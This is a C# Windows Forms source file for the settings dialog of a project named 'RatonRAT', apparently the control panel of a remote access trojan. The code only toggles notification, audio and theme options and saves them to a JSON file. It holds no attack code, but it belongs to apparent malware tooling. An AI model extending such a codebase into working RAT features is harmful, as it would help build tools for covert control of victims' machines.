using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace RatonRAT
{
    public partial class Configuration : Form
    {
        private const string configFilePath = "Data/userConfig.json";
        private UserConfig userConfig;

        public Configuration()
        {
            InitializeComponent();
            this.Paint += Form_Paint;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ListViewItem selectedItem = listView1.SelectedItems[0];

                if (selectedItem.Text == "Toggle Notifications")
                {
                    userConfig.notificationMute = !userConfig.notificationMute;
                    selectedItem.ImageKey = userConfig.notificationMute ? "ToggleBell2.png" : "ToggleBell.png";
                }
                else if (selectedItem.Text == "Toggle Audio")
                {
                    userConfig.audioMute = !userConfig.audioMute;
                    selectedItem.ImageKey = userConfig.audioMute ? "ToggleAudio2.png" : "ToggleAudio.png";
                }
                else if (selectedItem.Text == "Experimental light theme")
                { 
                    userConfig.darkMode = !userConfig.darkMode;
                    selectedItem.ImageKey = userConfig.darkMode ? "ToggleTheme2.png" : "ToggleTheme.png";
                }

                SaveConfig();

                if (userConfig.notificationMute || userConfig.audioMute || userConfig.darkMode)
                    Server.Classes.SFX.disable();
                else
                    Server.Classes.SFX.enable();
            }
        }


        private void Configuration_Load(object sender, EventArgs e)
        {
            LoadConfig();
            new RatonRAT.Classes.LightMode().Apply(this);
            ListViewItem item1 = new ListViewItem("Toggle Notifications", "notifications");
            ListViewItem item2 = new ListViewItem("Toggle Audio", "audio");
            ListViewItem item3 = new ListViewItem("Experimental light theme", "mode");

            if (userConfig.notificationMute)
                item1.ImageKey = "ToggleBell2.png";
            else
                item1.ImageKey = "ToggleBell.png";

            if (userConfig.audioMute)
                item2.ImageKey = "ToggleAudio2.png";
            else
                item2.ImageKey = "ToggleAudio.png";

            if (userConfig.darkMode)
                item3.ImageKey = "ToggleTheme2.png";
            else
                item3.ImageKey = "ToggleTheme.png";

            listView1.Items.Add(item1);
            listView1.Items.Add(item2);
            listView1.Items.Add(item3);
        }

        private void LoadConfig()
        {
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { darkMode = false, audioMute = false, notificationMute = false };
            }
        }

        private void SaveConfig()
        {
            if (File.Exists(configFilePath))
            {
                File.Delete(configFilePath);
            }
            string json = JsonConvert.SerializeObject(userConfig, Formatting.Indented);
            Directory.CreateDirectory(Path.GetDirectoryName(configFilePath));
            File.WriteAllText(configFilePath, json);
        }

        private class UserConfig
        {
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveConfig();
            Application.Restart();
        }
    }
}
